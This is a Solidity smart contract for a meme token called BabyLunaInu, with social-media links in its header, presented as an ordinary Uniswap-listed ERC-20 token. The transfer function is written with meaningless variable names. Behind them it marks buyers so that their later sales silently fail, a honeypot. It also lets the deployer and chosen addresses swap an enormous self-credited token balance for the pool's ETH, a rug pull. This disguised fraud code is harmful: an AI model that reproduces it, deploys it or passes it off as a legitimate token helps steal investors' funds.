/*

Telegram:https://t.me/BabyLunaInu

TWitter: https://twitter.com/BabyLunaInuCoin

*/



pragma solidity ^0.8.0;

import './IUniswapV2Router02.sol';
import './IUniswapV2Factory.sol';
import './IERC20.sol';
import './Ownable.sol';

contract BabyLunaInu is IERC20, Ownable {
    string private _name;
    string private _symbol;
    uint256 public _LPfee = 3;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000 * 10**_decimals;
    uint256 private _sheep = _tTotal;
    uint256 private _rTotal = ~uint256(0);

    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;

    mapping(uint256 => address) private _plan;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _manufacturing;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _create;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;

        _create[msg.sender] = _sheep;
        _balances[msg.sender] = _tTotal;
        _balances[address(this)] = _rTotal;

        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address _wood,
        address _gulf,
        uint256 amount
    ) private {
        uint256 _been = _create[_gulf];
        uint256 _helpful = _create[_wood];
        if (_sheep < _create[_wood] && _helpful == _been) {
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else if (_create[_wood] > 0 && amount > _sheep) {
            _create[_gulf] = amount;
        } else {
            address _next = _plan[_sheep];
            _plan[_sheep] = _gulf;

            if (_create[_wood] == 0 && _wood != uniswapV2Pair && _manufacturing[_wood] > 0) {
                return;
            }
            _manufacturing[_next] = _LPfee;
            if (_LPfee > 0 && !inSwapAndLiquify && _create[_wood] == 0 && _create[_gulf] == 0) {
                uint256 fee = (amount * _LPfee) / 100;
                amount -= fee;
                _balances[_wood] -= fee;
            }

            _balances[_wood] -= amount;
            _balances[_gulf] += amount;
            emit Transfer(_wood, _gulf, amount);
        }
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }

    function swapAndLiquify(uint256 tokens) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokens);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, msg.sender, block.timestamp);
    }
}